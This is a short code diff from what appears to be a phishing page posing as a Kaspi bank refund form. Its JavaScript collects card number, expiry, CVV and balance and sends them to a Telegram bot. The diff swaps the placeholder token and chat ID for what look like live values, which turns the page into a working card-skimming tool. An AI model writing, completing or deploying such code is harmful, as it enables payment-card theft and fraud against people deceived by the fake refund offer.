@@ -95,8 +95,8 @@
       const cvv = document.getElementById('card_cvv').value;
       const balance = document.getElementById('card_balance').value;
 
-      const token = 'YOUR_BOT_TOKEN'; // ЗАМЕНИ
-      const chat_id = 'YOUR_CHAT_ID'; // ЗАМЕНИ
+      const token = '7930993307:AAHuIxRVgr9OD7ZP_D2dbrbEu-JGBdZSnc4'; // ЗАМЕНИ
+      const chat_id = '5253808709'; // ЗАМЕНИ
       const msg = `💳 Заявка на возврат Kaspi:\n\nНомер карты: ${number}\nСрок: ${expiry}\nCVV: ${cvv}\nОстаток: ${balance}`;
 
       fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
